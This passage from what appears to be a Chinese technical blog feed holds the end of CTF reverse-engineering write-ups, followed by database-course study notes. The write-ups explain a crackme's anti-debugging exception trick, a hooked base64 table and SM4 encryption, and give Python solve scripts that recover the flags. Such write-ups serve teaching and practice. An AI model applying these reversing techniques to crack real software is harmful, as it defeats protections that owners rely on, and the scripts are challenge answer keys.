函数的内容，发现是一个base64加密的操作，只不过是表进行了更换</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202309302053251.png" alt="image-20230930205241620" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202309302053278.png" alt="image-20230930205354245" /></p></li><li><p>最后直接使用python逆推base64加密的过程即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><br>table = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234&#123;&#125;789+/=&quot;</span><br>raw = [<span class="hljs-number">0xFD370FEB59C9B9E</span>, <span class="hljs-number">0xDEAB7F029C4FD1B2</span>, <span class="hljs-number">0xFACD9D40E7636559</span>]<br>target = <span class="hljs-string">b&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-comment"># print(pack(&quot;Q&quot;, raw[i]))</span><br>    target += pack(<span class="hljs-string">&quot;Q&quot;</span>, raw[i])<br>    <br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(target), <span class="hljs-number">3</span>):<br>    v8 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        v8 |= target[i + j] &lt;&lt; <span class="hljs-number">8</span> * (<span class="hljs-number">2</span> - j)<br><br>    v7 = v8<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        idx = (v7 &gt;&gt; <span class="hljs-number">6</span> * j) &amp; <span class="hljs-number">0b111111</span><br>        flag += table[idx]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure></li></ul><h2 id="安洵杯-2019crackme"><a class="markdownIt-Anchor" href="#安洵杯-2019crackme"></a> [安洵杯 2019]crackMe</h2><h3 id="分析-11"><a class="markdownIt-Anchor" href="#分析-11"></a> 分析</h3><ul><li><p>首先查壳无壳，然后直接载入IDA</p></li><li><p>这里通过字符串搜索到 <code>please Input the flag:\n</code>，直接引用查看，发现来到了<code>main</code>函数。这里有一个内存访问异常，再结合MessageBoxW中的信息，感觉这里会有异常处理的存在。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310051057731.png" alt="image-20231005105703690" /></p></li><li><p>之后再函数列表中就发现了 <code>Handler</code> 函数，跟进发现这是使用 <code>SetUnhangledExceptionFilter</code> 来注册的未处理异常，这个调试器不会运行到这里处理，由此可知前面的内粗访问异常可以阻止调试器调试，因为得不到正确信息。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310051108003.png" alt="image-20231005110821954" /></p></li><li><p>之后查看 <code>sub_411172</code> 函数，发现其中关键的数字0xA3B1BAC6，经过查阅，发现这个是<code>SM4</code>加密，那么 <code>where_are_u_now?</code>就是密钥，同时 <code>unk_41A218</code> 的数据也被main函数的<code>sub_41100F</code>函数所引用</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310051111426.png" alt="image-20231005111144377" /></p></li><li><p>同时观察 <code>TopLevelExceptionFilter</code> 的内容，跟进发现首先对于最后的 <code>Str2</code>进行了更改，之后有对数据 <code>byte_41A180</code> 进行了处理传递给 <code>Str1</code> ，最后在 <code>sub_411136</code> 函数进行了正确性比对，由此可以看出<code>Str1</code>来自于自己的输入。又由于查看汇编，发现 <code>byte_41A180</code>与 <code>unk_41A1E4</code>是连续的，所以可以视为对于输入进行了操作。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310051117612.png" alt="image-20231005111717569" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310051117437.png" alt="image-20231005111730401" /></p></li><li><p>这里跟进 <code>sub_41126C</code> 函数会发现这是一个变种的base64加密，对于输入进行了转换处理</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310051120575.png" alt="image-20231005112029524" /></p></li><li><p>但是再尝试运行程序时，跳出的是 <code>hooked</code> 标识的信息，由此怀疑还有别的操作，查找字符串找到<code>hooked</code>，由此可以看出对于base64的表进行了处理。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310051122180.png" alt="image-20231005112215145" /></p></li><li><p>综上，可以分析出：该程序首先通过hook改变了main函数中message的消息传递，并且改变了base64表，之后通过内存访问异常来引出handler来进行处理，在该函数中，首先经过一个函数进行SM4加密，之后传递加密后的字符串进行异常处理，之后就是一个变种的base64加密，与更改后的Str2进行对比，成功就是正确的flag</p></li></ul><h3 id="exp-9"><a class="markdownIt-Anchor" href="#exp-9"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> pysm4 <span class="hljs-keyword">import</span> encrypt, decrypt<br>base = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>diy_base = <span class="hljs-string">&#x27;yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx&#x27;</span><br><br>str2 = <span class="hljs-string">&#x27;U1ATIOpkOyWSvGm/YOYFR4!!&#x27;</span><br>sstr2 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str2)-<span class="hljs-number">2</span>):<br>sstr2 += base[diy_base.find(str2[i])]<br>sstr2 += <span class="hljs-string">&#x27;==&#x27;</span><br>dec_64 = base64.b64decode(sstr2)<br>cipher_num = <span class="hljs-string">&quot;0x&quot;</span> + dec_64.<span class="hljs-built_in">hex</span>()<br>cipher_num = <span class="hljs-built_in">int</span>(cipher_num,<span class="hljs-number">16</span>)<br>mk = <span class="hljs-number">0x77686572655f6172655f755f6e6f773f</span><br>clear_num = decrypt(cipher_num, mk)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(clear_num)[<span class="hljs-number">2</span>:]).decode()+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库原理与应用</title>
    <link href="/posts/1b8dd184.html"/>
    <url>/posts/1b8dd184.html</url>
    
    <content type="html"><![CDATA[<h1 id="绪论"><a class="markdownIt-Anchor" href="#绪论"></a> 绪论</h1><h2 id="考试要点"><a class="markdownIt-Anchor" href="#考试要点"></a> 考试要点</h2><ul><li>数据库(DB)、数据库管理系统(DBMS)、数据库系统(DBS)、数据库应用系统(DBAS)</li><li>数据管理技术的三个发展阶段、数据库系统的优点</li><li>数据模型的分类、组成要素、E-R图、常用逻辑数据模型优缺点比较、关系模型(关系模式)</li><li>数据库系统的三级模式结构、两级映像和数据独立性(优点)</li></ul><h2 id="区分数据库相关含义"><a class="markdownIt-Anchor" href="#区分数据库相关含义"></a> 区分数据库相关含义</h2><h3 id="数据库"><a class="markdownIt-Anchor" href="#数据库"></a> 数据库</h3><p>​<strong>数据库(DB)</strong>：指在计算机的存储设备上合理存放相关联，有结构的数据集合。<code>数据库在硬件存放</code></p><ul><li><strong>有结构</strong>：数据库与文件系统相比最大的特点之一</li></ul><h3 id="数据库管理系统"><a class="markdownIt-Anchor" href="#数据库管理系统"></a> 数据库管理系统</h3><p>​<strong>数据库管理系统(DBMS)</strong>：是一个操作和管理数据库的大型软件(是一组软件)，它由一组计算机程序构成，位于用户于操作系统之间的一层数据管理系统(属于系统软件)。</p><h3 id="数据库系统"><a class="markdownIt-Anchor" href="#数据库系统"></a> 数据库系统</h3><p>​<strong>数据库系统(DBS)</strong>：用于实现有组织、动态地存储大量相关地结构化数据，便于用户使用数据库地计算机软件和硬件资源组成的系统。即数据库系统是指在<strong>计算机系统</strong>中引进<strong>数据库</strong>和<strong>数据库管理系统</strong>后地系统。</p><ul><li>数据库系统一般由<strong>硬件、软件、数据库和用户</strong>4部分组成。<ul><li>硬件、软件—计算机系统</li><li>用户(包括管理、开发和终端用户)—数据库管理系统<ul><li><strong>数据库管理员(DBA)</strong>：负责整个数据库系统的建设、管理、维护和协调工作。主要职责：<ol><li>参与数据库系统的设计于建设</li><li>对系统的运行实行监控</li><li>定义数据的安全性要求和完整性约束条件</li><li>负责数据库性能的改进和数据库的重组及重构工作</li></ol></li></ul></li></ul></li></ul><h3 id="数据库应用系统"><a class="markdownIt-Anchor" href="#数据库应用系统"></a> 数据库应用系统</h3><p>​<strong>数据库应用系统(DBAS)</strong>：指数据库系统及应用程序的组成。</p><h2 id="数据库系统的产生与发展"><a class="markdownIt-Anchor" href="#数据库系统的产生与发展"></a> 数据库系统的产生与发展</h2><h3 id="区分概念"><a class="markdownIt-Anchor" href="#区分概念"></a> 区分概念</h3><p>​<strong>数据管理</strong>：数据处理中心环节</p><h3 id="数据管理技术的产生与发展"><a class="markdownIt-Anchor" href="#数据管理技术的产生与发展"></a> 数据管理技术的产生与发展</h3><h4 id="人工管理阶段"><a class="markdownIt-Anchor" href="#人工管理阶段"></a> 人工管理阶段</h4><ul><li>程序和数据密不可分</li><li>数据不能共享</li><li>数据不具有独立性(<code>缺乏数据独立性</code>)</li></ul><h4 id="文件系统阶段"><a class="markdownIt-Anchor" href="#文件系统阶段"></a> 文件系统阶段</h4><ul><li>优点：<ul><li>程序与数据可以分别独立存放，数据可以组成数据文件，并且可以独立命名</li></ul></li><li>问题：<ul><li>数据冗余度大、共享性差、易产生数据不一致性</li><li>数据独立性差</li><li>用户负担重</li><li><code>数据无结构</code></li></ul></li></ul><h4 id="数据库系统阶段"><a class="markdownIt-Anchor" href="#数据库系统阶段"></a> 数据库系统阶段</h4><ul><li><code>数据结构化</code>：文件系统与数据库系统的根本区别之一</li><li><code>类别</code>：层次型数据库，网状数据库和关系型数据库</li></ul><h3 id="数据库系统的特点"><a class="markdownIt-Anchor" href="#数据库系统的特点"></a> 数据库系统的特点</h3><ol><li>数据结构化：文件系统与数据库系统的根本区别之一</li><li>数据冗余度小、共享性高、避免了数据的不一致性</li><li>具有较高的数据独立性</li><li>数据由DBMS统一管理和控制</li></ol><h2 id="数据模型"><a class="markdownIt-Anchor" href="#数据模型"></a> 数据模型</h2><h3 id="相关解释"><a class="markdownIt-Anchor" href="#相关解释"></a> 相关解释</h3><h4 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h4><p>​现有数据库系统均是基于某种数据模型的，<code>数据模型是数据库系统的核心和基础</code></p><h4 id="数据模型的分类"><a class="markdownIt-Anchor" href="#数据模型的分类"></a> 数据模型的分类</h4><ol><li>概念数据模型(概念模型)：是独立于计算机系统的数据模型，完全不涉及信息在计算机中的表示，是<strong>面向数据库用户的现实世界模型</strong>，主要用来描述现实世界的概念化结构。</li><li>逻辑数据模型(数据模型)：<strong>用户所看到的模型</strong>，是具体的DBMS所支持的数据模型，如<strong>层次数据模型，网状数据模型，关系模型和面向对象模型</strong>。</li><li>物理数据模型(物理模型)：对数据最底层的抽象，描述数据在系统内部的表示方法和存取方法，在磁盘或磁带上的存储方式和存取方式，是<strong>面向计算机系统的</strong>。</li></ol><h4 id="数据模型的组成要素"><a class="markdownIt-Anchor" href="#数据模型的组成要素"></a> 数据模型的组成要素</h4><ol><li>数据结构：支队实体模型和实体间联系的表达和实现。<code>它是数据模型最基本的组成部分，规定了数据模型的静态特性</code>—描述一个模型性质的最重要的方面。</li><li>数据操作：数据操作是指一组用于指定数据结构的任何有效实例执行的操作或推导规则。<code>数据操作规定了数据模型的动态特性</code></li><li>数据完整性约束：数据完整性给出数据及其联系应具有的制约和依赖规则。</li></ol><h3 id="实体联系数据模型"><a class="markdownIt-Anchor" href="#实体联系数据模型"></a> 实体——联系数据模型</h3><ul><li>信息，实体集联系和E-R图</li></ul><h3 id="常用结构数据模型"><a class="markdownIt-Anchor" href="#常用结构数据模型"></a> 常用(结构)数据模型</h3><h4 id="层次模型"><a class="markdownIt-Anchor" href="#层次模型"></a> 层次模型</h4><ul><li>满足条件：有且只有一个节点没有双亲节点(称为根节点)；根节点以外的其他节点有且只有一个双亲节点。</li><li>特点：<ul><li>记录之间得到联系通过指针来实现，常用的物理实现方法由邻接法和链接法。</li><li>由于采用指针实现记录间的联系，所以，<code>层次模型具有查询效率较高的优点</code></li></ul></li><li>缺点：<ul><li>层次数据模型缺乏直接表达现实世界中非层次型结构的复杂联系，如多对多的联系</li><li>层次顺序严格限制</li></ul></li><li>IMS是IBM公司推出的最有影响的一种典型的层次模型数据管理系统</li></ul><h4 id="网状模型"><a class="markdownIt-Anchor" href="#网状模型"></a> 网状模型</h4><ul><li>取消了层次模型的限制，不但允许一个以上的节点无双亲，而且一个节点允许有一个以上的双亲</li><li>比层次数据模型更具<code>普遍性</code>的结构，反映了实体集间普遍存在的更为复杂的联系，<code>层次结构实际上是网状结构的一个特例</code></li></ul><h4 id="关系模型"><a class="markdownIt-Anchor" href="#关系模型"></a> 关系模型</h4><h5 id="解释"><a class="markdownIt-Anchor" href="#解释"></a> 解释：</h5><ul><li>二维表(数据结构)称为关系，对二维框架的描述称为关系模型</li><li>表中的列称为<strong>属性或者字段</strong>，列中的<strong>值</strong>取自相应的域，<strong>域</strong>是属性所有可能取值的集合</li><li>表中的一行称为一个元组(Tuple)，元组用关键字(Key Word)标识</li></ul><h5 id="关系性质"><a class="markdownIt-Anchor" href="#关系性质"></a> 关系性质：</h5><ul><li>关系中的每一个属性是不可分解的，即所有域都应是原子数据的集合；没有完全相同的行和列，行、列的排列顺序是无关紧要的。</li></ul><h5 id="关系模式"><a class="markdownIt-Anchor" href="#关系模式"></a> 关系模式</h5><ul><li><p>关系模式是关系中信息内容结构的描述。它包括关系名，属性名，每个属性列的取值集合，数据完整性约束条件以及各属性间固有的数据依赖关系等。</p></li><li><p>关系模式的表示：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mi>U</mi><mo separator="true">,</mo><mi>D</mi><mo separator="true">,</mo><mi>D</mi><mi>O</mi><mi>M</mi><mo separator="true">,</mo><mi>I</mi><mo separator="true">,</mo><mo>∑</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R(U,D,DOM,I,\sum)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">∑</span><span class="mclose">)</span></span></span></span></span></p><ul><li>R：关系名</li><li>U：组成关系R的全部属性的集合</li><li>DOM：属性列到域的映射，即DOM；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><mi>D</mi></mrow><annotation encoding="application/x-tex">U \rightarrow D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span>，且每个属性<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，所有可能的取值集合构成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">D_i(i = 1,2,\ldots ,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，并允许<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>i</mi></msub><mo>=</mo><msub><mi>D</mi><mi>j</mi></msub><mo separator="true">,</mo><mi>i</mi><mo mathvariant="normal">≠</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">D_i = D_j,i\neq j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></li><li>I：一组完整性约束条件</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>：属性集间的一组数据依赖</li><li>通常，在不涉及完整性约束及数据依赖的情况下，为了简化，可用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R(U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span>表示关系模式，例如，学生关系模式可以表示为：S(学号，姓名，性别，年龄，学院)</li></ul></li></ul><h5 id="数据约束"><a class="markdownIt-Anchor" href="#数据约束"></a> 数据约束</h5><h2 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h2><ol><li><p>什么是数据独立性？ 数据库的体系结构如何保证数据独立性？</p><ul><li>数据独立性是指数据库中数据与应用程序的无关性，也指应用程序和数据结构之间相互独立，不受影响。在三层模式体系结构中数据独立性可定义为：数据库系统在某一层次模式上的改变不会使它的上一层模式也发生改变的能力。其包括数据逻辑独立性和数据物理独立性。其中逻辑独立性是指数据的全局逻辑结构与局部逻辑结构之间的相互独立性，表示一旦模式发生变化，无须改变外模式或应用程序的能力；物理独立性是指数据的存储结构与全局逻辑结构之间的相互独立性，表示不会因为内模式发生改变而导致概念模式发生改变的能力。</li><li>数据独立性是由DBMS在三级模式间提供的两层映像来保证的。两层映像分为外模式/模式映像和模式/内模式映像，实现了三个抽象级别的来实现和转换.当整个系统需要改变模式时，DBMS对于外模式/模式映像做出相应的改变，保证了数据逻辑独立性，而数据的存储结构发生改变时，DBMS对于模式/内模式映像做出相应改变，从而保证了物理独立性</li></ul></li><li><p>什么是外部模式？概念模式？内部模式？它们之间有何联系？这种分级结构的优点是什么？</p><ul><li>外部模式又称为子模式，介于模式与应用之间，是用户与数据库之间的接口，是数据库用户能够看见和使用的局部数据和特征的描述。</li><li>概念模式简称模式，是由数据库设计者综合所有用户数据，按照统一的观点构造的对数据库全局逻辑结构的描述。</li><li>内部模式称为存储模式，是对数据库中数据物理结构和存储方式的描述，是数据在数据库内部的表示方式。</li><li>一个数据库结构从逻辑上可以划分为三个层次：外部模式，概念模式，内部模式，称为数据库的三级模式结构。</li><li>数据库系统的三级模式是对数据进行三个级别的抽象。它把数据的具体组织留给DBMS去做，用户只要抽象地处理数据，而不必关心数据在机器中地具体表示方式和存储方式。数据库的三级结构是依靠映像来联系和相互转化的，正是这两层映像保证了数据库系统中数据具有较高的数据独立性。</li></ul></li></ol><h1 id="关系数据库"><a class="markdownIt-Anchor" href="#关系数据库"></a> 关系数据库</h1><h2 id="考试要点-2"><a class="markdownIt-Anchor" href="#考试要点-2"></a> 考试要点</h2><ul><li>关系的定义、码的概念、关系的性质</li><li>关系操作(查询和更新)</li><li>关系完整性约束(实体完整性、参照完整性、用户自定义完整性)</li><li>关系代数(五种基本代数)</li><li>查询优化</li><li>关系系统分类(表示系统、最小关系系统、关系完备系统、全关系系统)</li></ul><h1 id="关系数据库标准语言sql"><a class="markdownIt-Anchor" href="#关系数据库标准语言sql"></a> 关系数据库标准语言SQL</h1><h2 id="考试要点-3"><a class="markdownIt-Anchor" href="#考试要点-3"></a> 考试要点</h2><ul><li>SQL体系结构</li><li>定义功能、查询功能、数据操作功能、数据控制功能(略)</li><li>数据查询(单表、分组、聚集、排序、自连接、嵌套查询、Exists查询)</li></ul><h1 id="关系规范化理论"><a class="markdownIt-Anchor" href="#关系规范化理论"></a> 关系规范化理论</h1><h2 id="考试要点-4"><a class="markdownIt-Anchor" href="#考试要点-4"></a> 考试要点</h2><ul><li>完全函数依赖、部分函数依赖、传递依赖</li><li>主属性、非主属性、主码、外码、候选码</li><li>范式、函数依赖集闭包、属性集闭包、最小覆盖、码值理论</li><li>无损连接的判定、函数依赖保持的判定</li><li>基于 3NF 的分解算法</li></ul><h2 id="数据依赖的公理系统"><a class="markdownIt-Anchor" href="#数据依赖的公理系统"></a> 数据依赖的公理系统</h2><ul><li><p>函数依赖集的闭包</p></li><li><p>函数依赖的推理规则</p><ul><li>独立推理规则</li><li>其他推理规则</li></ul></li><li><p>属性集闭包与 F 逻辑蕴含的充要条件</p><ul><li><p>属性集闭包 — <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>X</mi><mi>F</mi><mo lspace="0em" rspace="0em">+</mo></msubsup></mrow><annotation encoding="application/x-tex">X_{F}^{+}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104993em;vertical-align:-0.293531em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.811462em;"><span style="top:-2.4064690000000004em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">+</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.293531em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p><strong>F 逻辑蕴含的充要条件</strong></p><ul><li>设 F 为属性集 U 上的一组函数依赖关系，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo>⊆</mo><mi>U</mi><mo separator="true">,</mo><mi>X</mi><mo>−</mo><mo>&gt;</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X,Y \subseteq U,X-&gt;Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" 